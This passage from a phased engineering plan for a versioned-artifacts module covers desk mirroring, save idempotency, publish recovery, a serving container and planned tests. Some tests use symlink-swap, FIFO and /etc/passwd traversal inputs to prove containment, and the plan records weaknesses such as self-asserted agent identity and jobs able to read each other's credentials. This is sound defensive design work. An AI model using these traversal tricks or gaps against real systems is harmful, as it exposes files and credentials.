   `mirrorOut(deskFd, worktreeDir)` from [The desk is agent-owned](#the-desk-is-agent-owned-so-containment-must-be-re-established-not-assumed)
   and carries its rules by construction: the descriptor chain replaces every path re-resolution, each
   entry is opened `O_NOFOLLOW` relative to its parent descriptor and `fstat`ed, non-regular entries are
   refused, and `max_files` / `max_file_size` / `max_total_size` are counted on the bytes actually read.
   Worktree files absent from the desk are deleted **except `.git`**, and a `.git` in the desk is never
   copied in. `safeResolve` still guards the worktree (store) side, where the root is trusted.
9. **Save idempotency — DECIDED: derive it from content, and delete `finalizedRef` entirely.**
   Today the commit is made by `applyChanges` in an earlier *tool call* and `finalize` only writes refs,
   which is why the version ref and the marker can share one `update-ref --stdin` transaction
   (`git-backend.js:717-731`) and why there is no crash window. Phase 2.8 merges mirror + commit + ref
   into one call and thereby *creates* the window the marker used to cover. The replacement needs no
   marker, because the draft branch tip already records everything a retry must know:

   `save_version` is:
   1. Mirror the desk into the worktree (idempotent — it re-mirrors the same desk).
   2. `git add -A`; if the index tree equals the draft tip's tree there is nothing new to commit. Then
      ask `versionIdForCommit(repo, tip)` (`git-backend.js:179-189`):
      - it returns an id → this is a **retry of a completed save**; return that id unchanged.
      - it returns `null` → this is the **crash window**: a commit exists with no version ref. Mint the
        ref for the existing tip. No second commit, no second version.
   3. Otherwise commit, then `createVersionRef` for the new commit.

   A genuine second save changes the tree, so it takes branch 3 and gets its own version — which is the
   point of keeping the draft open.

   **`save_version` therefore never throws `DRAFT_HAS_NO_CHANGES`, and the code dies with this phase.**
   The tree-unchanged-with-a-ref case is indistinguishable, from content alone, between "a retry after a
   timeout" and "a deliberate second save with no edits in between" — so returning the existing id is the
   only answer that is correct for both: the retry gets its version id instead of an error, and the
   pointless second save is told, truthfully, which version already holds exactly these bytes. An error
   there would fail a *successful* save from the caller's point of view. The three sites that throw the
   code today all disappear in this phase — `applyChanges` (`git-backend.js:532`, `:614`) is deleted by
   item 2, `finalize` (`:717`) is replaced by this item — so also delete `DRAFT_HAS_NO_CHANGES` from
   `errors.js:4` and from both error tables that document it
   (`workspace/versioned-artifacts.md:66`, `docs/modules/versioned-artifacts.md:54`). Leaving a code no
   path can throw is the same defect class as F6's stale prose.

   This deletes `finalizedRef` (`:34`, `:166`), the `'finalized'` branch of `draftState`, the resume arm
   of `finalize` (`:705-711`), and the `state === 'finalized'` half of `prepareDraft`'s `allowMarkers`
   (`service.js:125`).

   **The automatic retry goes too, and read why before deleting it.** `service.js:207-217`'s single
   `FINALIZE_FAILED` retry exists for *teardown* — its own comment says "the version and its marker
   already exist, the retry skips straight to finishing the teardown". Phase 2.8 removes the teardown from
   this operation, so that retry has nothing left to converge on: `save_version` calls `prepareDraft`
   **without** `allowMarkers` (it requires a genuinely open draft) and does not self-retry; idempotency
   comes from step 2 on the caller's next attempt instead. `discard_draft` still tears down, so it keeps
   `allowMarkers: true` and its `discarding` path exactly as today. Do not carry the retry over by
   analogy — a retry around a non-idempotent commit is how one save becomes two versions.

   Item 9 also makes `versionIdForCommit`'s uniqueness **load-bearing**: it throws on two version refs
   sharing one commit, so nothing else in the module may ever point a second version ref at an existing
   commit. State that invariant in the module doc and assert it in a test.
10. Follow the lifecycle change through `draftState` / `requireOpenDraft` / `recoverDraft` /
    `reconcileDrafts` / `teardownDraft`, and `service.prepareDraft`'s `allowMarkers` (`:122-125`).
    **`missing`, `incomplete` and `discarding` stay unchanged** — `reconcileDrafts` (`:417-424`) tears
    down exactly the `incomplete` drafts, and that is the startup sweep the module advertises and that
    `regressions.test.js:259` covers. `'finalized'` **disappears** (item 9), so `allowMarkers` narrows to
    `discarding` alone; `draftState` loses one `refExists` round-trip per call, which is also the boot
    sweep's cost driver in *Still open* item 1.
11. `versioned_artifact_list` returns the artifact codes this scope may use (`allowed_artifacts` ∩ `be.listFolders`),
    each with `current_version` **and its open drafts**. Without the drafts the recovery story does not
    close: a retried attempt starts with a wiped desk and a fresh agent that does not know the
    `draft_id`. Read `title`/`owner` from the `versioned_artifact` table, falling back to the store listing
    for artifacts with no row yet (phase 4 writes the rows).
12. Rewrite `workspace/versioned-artifacts.md` for the new flow: create_draft → edit the returned path with
    your normal file tools → save_version → publish → discard_draft; materialize to read a version or to
    recover after a retry.
13. **Docs that ship with this phase** (they describe behaviour this phase changes, so they cannot wait for
    phase 6): the tool list, desk/store split and removed-tool sections of
    `docs/modules/versioned-artifacts.md`; `docs/architecture/zero-trust.md:78-96` — "the store is mounted
    into the toolbox only" stays **true** and must be restated precisely, alongside the new fact that a
    materialized copy lives on the job's own desk under `workspace/artifacts`, which every agent run
    shares; and the `CLAUDE.md` bullet (new name, desk-copy model, no path parameters).

**Tests:** the registered set is exactly ten names; no schema has a `user` key or a path-shaped key;
extend the git-leak guard to include `tag` **and** to scan tool *descriptions*, not just names and
parameter keys. New `materialize.test.js`: a draft materializes without `.git`; a version materializes
byte-identically; unknown version → `VERSION_NOT_FOUND`; both selectors named → refused; missing
`artifactsDir` → `WORKSPACE_UNAVAILABLE`; materialize over an existing desk replaces it.
`git-backend-drafts.test.js`: two `save_version`s on one draft yield two version ids and `diff` works
between them; a desk deletion propagates; each limit is enforced at save.
`service.test.js`: `allowed_artifacts` still denies before any store access and still audits the denial.

New `desk-containment.test.js` — `describe.skipIf(process.platform !== 'linux')`, proving items 4/6/8
rather than asserting the prose. The case that matters most is replacement **after** validation: complete
`openDesk`, then rename a component aside and put a symlink in its place, and assert the held descriptor
still reads the real desk, that re-opening that name is refused, and that the link target is untouched.
Then: a desk component that is *already* a symlink is refused (materialize AND save_version); a symlink
inside the desk is skipped by `mirrorOut` and `unlinkAt`ed rather than followed by `emptyDesk`, its target
surviving; a desk file larger than `max_file_size` is refused by the fd-based count even though a prior
`stat` reported it small (write the excess after the stat); `tar` extraction lands in the store tmp and
never on the desk; the mirror does not delete the worktree's `.git`,
proven by the draft still being usable for a second `save_version`; a `.git` placed in the desk is not
copied into the worktree.

A FIFO in the desk is refused, and that test must be bounded **by something the blocked loop cannot
starve**. A vitest `{ timeout: 2000 }` cannot do it: the timeout is a timer on the very event loop
`openSync` blocks, so it never fires — measured, a 100 ms timer scheduled immediately before a blocking
FIFO open never ran and the process had to be killed from outside. So run this one case in a child
process: `spawnSync(process.execPath, ['-e', <mirrorOut over a desk containing a FIFO>],
{ timeout: 2000 })`, whose deadline the parent enforces natively, outside any JS event loop. Assert the
child exited **normally** having refused the non-regular entry (measured: `status: 3`, `signal: null`);
a regression to a blocking open appears as `signal: 'SIGTERM'` with `status: null` (measured), failing the
test in bounded time instead of hanging the suite. Write it as the FIFO appearing at the name `mirrorOut`
is about to open, since the flag exists for exactly that case. This is the only case in the suite whose
subject can block the loop — every other desk operation fails fast (`ENOTDIR`, `EEXIST`, `ENXIO`, or an
ordinary short read), so nothing else needs the child harness. A missing desk is its own pair of tests: `save_version` with no desk returns `DESK_MISSING` and
leaves the draft tip, the worktree and the version list unchanged (assert the ref list before and after),
while an existing desk the agent emptied on purpose still saves the deletions and yields a new version —
absence and emptiness must not collapse into one behaviour. `materialize` on the same missing desk
succeeds, because it creates.

Idempotency for item 9, injected between the commit and the version ref: the retry mints the ref for the
existing tip and returns **one** version id, and the draft branch carries exactly one commit; a retry
after a *completed* save returns the same id and creates nothing; and `DRAFT_HAS_NO_CHANGES` is thrown by
no path at all — a repo-wide grep for it finds only this deletion, which is the guard for the class.
**Done when:** `npm test` green, and a manual toolbox session can create a draft, edit the directory
with plain shell commands, save twice and diff — with no tool call that names a path — and a desk whose
ancestor has been replaced by a symlink is refused instead of followed.
**Risk:** run `regressions.test.js` and the injected-git-failure suite first after every change.

---

## Phase 3 — Published tree, relative `current`, opt-in retention, publish recovery · 4.5 d · needs 1–2

1. Add `published_root` **and its validation** (reuse `asStorageRoot`, `service.js:30`), plus
   `serving/keep_versions` (int, default 0) and `serving/public_base_url` (default `http://localhost:8080`)
   to `config.json` and `system.json`.
2. Layout, chosen so the URL path maps 1:1: `<published_root>/<artifact_code>/v/<version_id>/…`, and
   `<published_root>/<artifact_code>/current` as a **relative** symlink to `v/<version_id>`.
3. In `save_version`, after the version ref exists, materialize into the published tree. A
   materialization failure **logs and returns `preview_path: null`** — it must never fail a save that
   already succeeded in the store.
4. `publish` — **order matters, and the CAS goes second.** The store's `current` ref is authoritative,
   so once it moves, a failure in anything after it leaves the store saying v2 while HTTP serves v1, and a
   retry with the caller's original `expected_current_version` is now refused by the CAS
   (`git-backend.js:361-385`) — the served state is stuck with no route forward. So:
   1. **Materialize the target first**, before the CAS (re-materializing it if retention pruned it). This
      only writes an immutable version directory, is idempotent, and is safely repeatable; if it fails,
      nothing has changed anywhere and the caller retries with the same arguments.
   2. **Then the CAS** (`update-ref` three-argument form, unchanged — it stays the only serialization point).
   3. **Then the symlink swap**: `fs.symlink('v/<id>', current.tmp-<rand>)` + `fs.rename(tmp, current)`.
      **Never `mv`** — a direct test proved an `mv` swap leaves `current` on the old version and drops a
      stray `.tmpnew` link inside it.

   **Recovery contract for a failure or process death between 2 and 3** — no new mechanism and, crucially,
   **no new branch**: reconcile is the *ordinary* call with `expected_current_version === version_id`.
   Re-running `publish(version_id=v3, expected_current_version=v3)` runs all three steps in order, and the
   three-argument `update-ref current v3 v3` in step 2 is a **no-op that verifies**: it succeeds precisely
   when `current` really is `v3` and fails with `CURRENT_VERSION_CHANGED` otherwise. Steps 1 and 3 are
   idempotent, so the repair is "call it again with the version that is already current" and the existing
   CAS *is* the check.

   Do **not** add a "skip the CAS when expected equals the target" shortcut: it would publish `v3` while
   the store still says `v1` — the store/served divergence this ordering exists to close, reintroduced
   by the recovery path. The CAS is the only serialization point, and it must be crossed on every call
   including the repair. This is also what `artifact:publish` (phase 4.5) does when an operator re-runs
   it. Step 3 failing after a successful CAS returns success for the store change with
   `preview_stale: true` and a logged WARN naming the repair call — never a bare success, and never a
   thrown error that would invite a retry the CAS must refuse.
5. `pruneVersions(publishedRoot, artifactCode, keep, currentTarget)`: with `keep > 0` delete materialized
   directories beyond the newest `keep`, **always excluding what `current` resolves to**. `keep === 0`
   prunes nothing. Called at the end of `save_version` and `publish`, inside the folder lock. The prune
   list is computed from the published tree only, never from a caller-supplied value.
6. `list_versions` returns `preview_path` — the relative `/<artifact_code>/v/<version_id>/` when the
   directory exists, `null` when pruned. A pruned version stays fully readable through `materialize`;
   only the browser preview is gone.
7. Build the absolute URL in exactly **one** helper, used by `publish` and `get_current` only.
   `list_versions` stays relative — a wrong absolute URL in a message to a human is worse than no URL.
   Never set `CONFIG__` for this in compose: ENV beats DB and would kill `config:set`.

**Tests** (new `published-tree.test.js`): save materializes identical bytes; `current` is relative and
its realpath stays inside the root; no `current.tmp-*` survives a publish and `current` resolves to the
new version (the direct regression for the `mv` bug); `keep_versions=0` prunes nothing; `keep_versions=2`
keeps the two newest **and** an older current target; a pruned version reports `preview_path: null` and
is still materializable; publishing a pruned version re-materializes first; a materialization failure
returns `preview_path: null` without throwing. `service.test.js`: the CAS is unchanged.
Failure injection for the ordering in item 4, which is the point of it: a materialization failure leaves
the store's `current` **unmoved** and the same call succeeds on retry; a symlink-swap failure after a
successful CAS returns `preview_stale: true` rather than throwing, and re-running the same publish with
`expected_current_version === version_id` then makes the store and the served tree agree — asserted by
reading both, not by the return value alone. Plus the negative: that repair call with the store's
`current` sitting on a *different* version is refused with `CURRENT_VERSION_CHANGED`, proving the repair
path did not become a CAS bypass.
8. **Docs that ship with this phase:** the published-tree layout, the relative `current` symlink,
   retention defaulting to keep-everything, and the publish recovery contract (item 4) — in
   `docs/modules/versioned-artifacts.md`, including the corrected "Out of scope" section, whose current
   text at `:193-195` still says HTTP serving is out of scope.

**Done when:** `ls -l storage/versioned-artifacts/published/<code>/` shows `current -> v/v-…` after a
publish, with the previous version still present under `keep_versions=0`.

---

## Phase 4 — `artifact:list`, `artifact:publish`, and the metadata row · 2 d · needs 1–3

1. Teach `toolbox/cli.js` an `--op` flag (`init | list | publish`), keeping the contract exactly: one
   JSON object on stdout, `{error_code, message}` on failure, never a stack trace, exit 1 on error.
2. `service.init` INSERTs the `versioned_artifact` row inside the same `audited()` call. A failed INSERT must
   not fail the init — log and continue, the way `recordAudit` degrades.
3. `--title` / `--owner` on `src/commands/init.py`, passed through the payload.
4. `src/commands/list.py` — artifact_code, title, owner, created_at, current version, preview URL, one row
   per artifact. Copy `_last_json_object` / `_sanitized` into `src/commands/_toolbox.py` rather than
   importing across command files.
5. `src/commands/publish.py` — `agento artifact:publish <artifact_code> <version_id> --expected <version_id>`.
   Same CAS, no new mechanism, **no approval flag**: publication is a human running this or explicitly
   asking the agent.
6. Register both in `di.json` `commands`. They are already in `_LOCAL_MODULE_COMMANDS` from phase 1, so
   they run on the host and exec into the toolbox rather than being proxied into cron (which sees
   neither the host source nor the storage volume).
7. **Docs that ship with this phase:** `docs/cli/artifact-list.md`, `docs/cli/artifact-publish.md`, a
   refreshed `artifact-init.md` (`--title`/`--owner`), and all three indexed in `docs/cli/README.md`.

**Tests:** `cli.test.js` — `--op list` returns rows; `--op publish` performs the CAS and returns
`CURRENT_VERSION_CHANGED` on a stale `--expected`; an unknown `--op` returns an error code, never a
throw. `test_list_command.py` — a valid-JSON non-object reply prints an error, not a traceback; a Node
stack on stderr is replaced by the fixed fallback line. `test_publish_command.py` — a stale `--expected`
exits non-zero with the code visible; a **missing** `--expected` is refused by argparse (never defaulted
— a default silently disables the concurrency guard).

---

## Phase 5 — The `artifacts` serving container · 2 d · needs phase 3

1. `src/agento/modules/versioned_artifacts/server/artifacts-server.js` — under `server/`, **not** `toolbox/`,
   because `src/agento/toolbox/config-loader.js:424-433` imports every `.js` in a module's `toolbox/`
   into the secrets container.
2. ~45 lines, zero new npm dependencies: the item 8 gate; an index at `/` listing the directories under the root; two
   ordered routes — `/:artifact_code/v/:version_id/*` with `version_id` matched against `VERSION_ID_RE`, and
   `/:artifact_code/*` rewritten onto `<artifact_code>/current/<rest>`; **our own realpath containment check**
   (proven necessary — `send` does zero `lstat`/`realpath` and served a file through a symlink pointing
   outside the root); then `express.static(root, {dotfiles: 'deny'})`. A pruned version falls through to
   the ordinary 404 — no branch. Root paths are read from env with defaults; note in a comment that
   since the service carries no `environment:` key, **the defaults are the only reachable values** and
   the env reads exist for the vitest harness.
3. Retry once on `EINVAL`/`ESTALE` before responding — the first request after a symlink swap returned
   500 through the macOS VirtioFS mount and the identical retry returned 200.
4. Add the `artifacts` service to **both** `templates/docker-compose.yml` and `docker-compose.dev.yml`, above
   the mysql block, using the existing image with **no `build:` block**. (The reason is not the drift
   guard — `test_provisioning.py:511-521` only compares the three known services and would ignore a new
   one. The real reason: `build_base_images` has a hardcoded three-entry `specs` list and would never
   build the tag.)
5. Keys, exactly: `command: ["node", "/app/modules/core/versioned_artifacts/server/artifacts-server.js"]` (it must
   sit under `/app` or Node cannot resolve express — proven: `ERR_MODULE_NOT_FOUND` at `/srv/app/`);
   three read-only volumes (the modules mount, the published tree, and `../app/etc:/app/etc:ro` from
   item 8); `ports: - "127.0.0.1:${AGENTO_ARTIFACTS_PORT:-8080}:8080"`; an explicit healthcheck
   probing `127.0.0.1:8080/` (the baked `HEALTHCHECK` at `Dockerfile:73-74` probes 3001 and reports the
   container unhealthy while it serves fine — proven live); `restart: unless-stopped`;
   `security_opt: - no-new-privileges:true`.
   **The two files differ in the modules mount source** — the template uses
   `../.venv/lib/python{{ python_version }}/site-packages/agento/modules`, the dev file uses
   `../src/agento/modules` (`:57`). The provisioning test reads only the template, so the dev file needs
   a manual diff at review.
6. A comment block directly above it in both files: the absence of `networks:`, `env_file:` and
   `environment:` is **deliberate and must stay**. One `networks:` line added for consistency puts every
   artifact on `agento-net`, where every agent in every agent_view can read every artifact over plain HTTP with
   `allowed_artifacts` bypassed for reads — silently, with no audit row.
   Third sentence for the same block: the service mounts `storage/versioned-artifacts/published`
   **exactly**, never the store root, and no other module writes into that tree. `docker-compose.override.yml`
   is user-owned and Compose *appends* volumes, so this mount is the enforcement that replaces the
   rejected `is_served` gate. Assert in `test_provisioning.py` that the volume source ends in `/published`.
7. On this Mac set `AGENTO_ARTIFACTS_PORT=8307` in `docker/.env` next to `MYSQL_PORT=3307`: five agento
   stacks run here at once and a bare 8080 collides.
8. **Module disablement must stop serving.** Mount `../app/etc:/app/etc:ro` as a third read-only volume
   (the same source the cron and toolbox services already mount, `templates/docker-compose.yml:18` — it
   holds `{module: bool}` and no secret), and gate every response on it: when
   `/app/etc/modules.json` parses and contains `"versioned_artifacts": false`, answer **503** for every
   route including `/`. Absent file, absent key, unparseable file → **serve**, because that is what
   module enablement actually means: `app/etc/modules.json` lists only explicitly toggled modules
   (verified — this repo's file holds seven entries and no core module), so absence is "enabled", not
   "unknown". This is a mirror of module enablement, **not** the `is_enabled` tool gate, which is the
   one that fails closed; do not conflate them.
   Re-read the file per request, `stat`-cached on mtime, so `mo:di` takes effect without a restart — the
   container has no DB and no `env_file` and must keep it that way. ~6 lines, no new dependency, no
   framework change, and the module-specific knowledge stays inside the module's own server, which is
   where it belongs.
9. **Docs that ship with this phase:** the serving container, its deliberate isolation (no `networks:`,
   no `env_file:`, no `environment:`), the disablement gate and the accepted deviation — in
   `docs/modules/versioned-artifacts.md`, the `CLAUDE.md` bullet, and `DECISIONS.md`.

**Tests** (new `artifacts-server.test.js`): a symlink pointing at `/etc/passwd` is refused; a dotfile never
returns its content; `/` lists the codes; unknown code and pruned version both 404; `/<code>/` serves
`current` and `/<code>/v/<id>/` serves a non-current version; a `stat` that throws `EINVAL` once then
succeeds yields 200. For item 8: with content published, `"versioned_artifacts": false` makes `/` and
`/<code>/` both 503 and the content is still on disk afterwards; flipping the value back to `true` serves
again without a restart; a missing file, a missing key and a truncated/unparseable file all serve. `layering.test.js` — `server/artifacts-server.js` imports neither `service.js` nor
`git-backend.js` and spawns no process (needs a **second directory constant**: `layering.test.js:10`
pins `DIR` to `toolbox/` and readdirs only that). `test_provisioning.py` — the rendered `artifacts` service
declares no `networks:`, no `env_file:`, no `environment:`, binds only `127.0.0.1`, carries its own
healthcheck, and has no `build:` block.
**Done when:** `curl http://127.0.0.1:8307/<code>/` returns the published version, `curl http://<LAN>:8307/`
is refused, `docker compose ps` shows the service healthy, and `agento mo:di versioned_artifacts` turns the
same curl into a 503 without deleting anything.

**Accepted deviation, to be recorded in DECISIONS.md:** the service is added unconditionally, because
`regenerate_compose` has no per-module service mechanism — `render_compose`
(`framework/cli/_provisioning.py:418-464`) is placeholder substitution, and a generic
"modules declare compose services" extension point is a framework feature this ticket is not buying.
The precedent is the existing unconditional storage bind mount.

The earlier wording of this deviation — "a deployment with the module disabled still runs a container
serving an empty tree" — was **wrong**, and item 8 exists because of it: the tree is only empty before
anything is published. Without the gate, `mo:di versioned_artifacts` removes the tools and leaves every
previously published version answering on `127.0.0.1`, which breaks CLAUDE.md's "every module must be
safely disableable". The container still starts unconditionally; what item 8 fixes is that it no longer
*serves* when the module is disabled.

Severity, stated honestly: the port is loopback-only, so the content is reachable only by someone who
already has a shell on the host and could `cat` the published tree directly. The gate buys correct
disablement semantics and an operator expectation that holds, not a new privilege boundary.

---

## Phase 6 — Recorded gaps and end-to-end · 1.5 d · needs 1–5

**Every doc that describes changed behaviour now ships with the phase that changes it** (phase 1 item 12,
phase 2 item 13, phase 3 item 8, phase 4 item 7, phase 5 item 9). That is the fix for the old shape of
this plan, in which phases 2–5 each shipped alone while the docs "absorbed schedule pressure" — a release
could therefore document removed tools, omit new operator commands and describe a superseded security
model. What is left here cannot be attached to a single phase: the cross-cutting gap record and the live
end-to-end.

Nothing depends on this phase, so it still absorbs schedule pressure — **except the ROADMAP entries, which
should land even if the rest slips**, since they are the only record of three framework gaps.

1. A final consistency pass over `docs/modules/versioned-artifacts.md` — the per-phase edits above each
   touch it, so read it once end to end for contradictions and dead references.
2. Record three gaps in `ROADMAP.md`, each as one sentence of consequence rather than a fix:
   - **(a)** append to the existing "Ungated Toolbox REST endpoints" entry that agent_view identity is
     self-asserted — `src/agento/toolbox/server.js:95` reads `agent_view_id` from a query parameter
     supplied by a config file living in the job's own writable artifacts directory — so it is the
     ceiling on every per-agent_view gate, `allowed_artifacts` included. The fix is session-bound identity in
     the framework, never a module-local caller check.
   - **(b)** there is no per-job isolation: `consumer.py:204-206` runs jobs as threads in one process,
     and `run_preparation.py:153-162` puts each run's credential in the directory that is also its HOME,
     so one job can read another job's desk and credential. Delegation makes concurrent jobs the normal
     case.
   - **(c)** `schedule_agent_job` needs a `job.type` widening plus an opened `AgentType`
     (`framework/job_models.py:17-21`, `bootstrap.py:255`) and `publisher.publish()` must learn `context`
     and `parent_id` (`publisher.py:84-93` writes neither), rather than a module re-implementing
     dedupe-then-insert. **`schedule_followup` must not be widened** — its idempotency key
     `followup:{source}:{reference_id}:{minute}` (`schedule.js:91`) collapses a two-agent fan-out in the
     same minute into one job and reports success.
3. Run `AGENTO_E2E=1 bin/test`, then a live end-to-end on the dev stack: `artifact:init` → enable the toolset
   for one agent_view → a real agent run that creates a draft, edits the returned directory, saves and
   publishes → `curl` the preview URL → `artifact:list` shows the new current → `mo:di
   versioned_artifacts` and the same curl returns 503.

**Done when:** `AGENTO_E2E=1 bin/test` green, the live e2e completes, and
`grep -rn 'apply_changes\|read_file\|finalize\|versioned_folder' docs/ CLAUDE.md` finds nothing that
still describes removed behaviour.

---

## Effort

| Phase | Days | Ships alone? |
|---|---|---|
| 0 — Jira proxy | 0.5 | yes, independent of everything |
| 1 — rename, schema, storage dirs, attribute hardening | 2 | yes |
| 2 — desk copies, materialize, save_version, containment | 6 | yes (no serving yet) |
| 3 — published tree, symlink, retention, publish recovery | 4.5 | yes (nothing serving it yet) |
| 4 — operator CLI | 2 | yes |
| 5 — serving container + disablement gate | 2 | yes |
| 6 — ROADMAP gaps, e2e | 1.5 | absorbs slip |
| **Total** | **18.5** | **envelope 17.5–19.5** |

Re-costed after the first plan review. The docs did not get cheaper — they moved out of phase 6 into the
phase that changes the behaviour they describe (~1.5 d redistributed across phases 1–5), which is why
phase 6 halves while every other phase grows. The genuinely *new* work is ~2 d: `desk-io.js` and its
test file (phase 2), the publish ordering plus failure-injection tests (phase 3), and the disablement
gate (phase 5). Phase 2 stays the phase to watch.

Phase 2 was costed at 3 days, then 5.5, and is honestly 6 after the second review: it deletes
`applyChanges` and `restoreWorktree`, adds `materialize` with two backends, adds server-side desk
derivation **plus the whole of `desk-io.js` — the fd-anchored walk, `mirrorIn`, `mirrorOut`, `emptyDesk`
and the store-side tmp extraction that keeps `tar` off the desk**, splits `finalize` into mirror + commit
+ ref with every limit re-enforced on the mirror, replaces the marker with content-derived idempotency,
and rewrites the draft state machine and its consumers — against a suite whose heaviest file
(`regressions.test.js`, 683 lines across 17 describes) is largely about exactly that machinery, plus a new
`desk-containment.test.js`. Round 3's additions — the `{ create }` flag, `DESK_MISSING`, the `O_NONBLOCK`
read flag and their three tests — are absorbed inside that 6 d rather than moving it again; they are a
flag, an error code and test cases, not new machinery. The half-day added over the previous estimate is
the extraction temp directory and the after-validation swap tests; the walk itself is roughly the code the discarded
`assertContained` would have cost, because it replaces that function rather than joining it.

---

## Still open

1. **Abandoned drafts.** `save_version` keeps the draft open, so nothing closes a draft except
   `discard_draft`. Should a draft untouched for N days be swept at toolbox start, or is a stuck draft an
   operator-visible condition cleared by hand, like today's abandoned locks? (The existing startup sweep
   reclaims *incomplete* drafts; this is about complete but abandoned ones.) This matters more than it
   looks: the boot sweep costs ~44 ms across 1000 artifacts when clean and ~7 s with 200 open drafts,
   because `draftState` spawns three or more git processes per draft in a serial loop — and `consumer.py`
   runs up to 10 job threads in one process, so abandoned drafts are normal residue, not an edge case.

2. **For the collaboration layer, not this ticket:** does the shared case area need a filesystem store at
   all, or is a DB row with a body plus the existing desk sufficient for the MVP? This decides whether
   that module is ~150 lines or ~400. Settle it when that layer is built, not now.

---

## Recorded gaps (not fixed in this release)

- **There is no deletion path anywhere in the module** — no tool, no CLI, no service method, no history
  prune. Removing an artifact means `rm -rf` inside the toolbox with no audit row.
- **`finalize` compares the draft only to its own base, never to `current`.** Harmless with one editor
  per artifact; with two it can mint an immutable version that silently reverts a peer. The CAS guards
  only the publish step, and only as well as the `expected_current_version` the caller chooses to pass.
- **`versioned_artifact_audit` is not a message log.** It has no body column and is explicitly exempted
  from the module's "the audit sinks never hold content" claim; `description` is agent-supplied, capped
  at 255 and mirrored verbatim into `audit-fallback.log`.
- **"Materialize" means two things in this plan** — the tool that copies onto the calling job's desk, and
  writing a version directory into the served tree. They are unrelated; the desk copy comes straight from
  the store. Keep them distinct in code and docs.
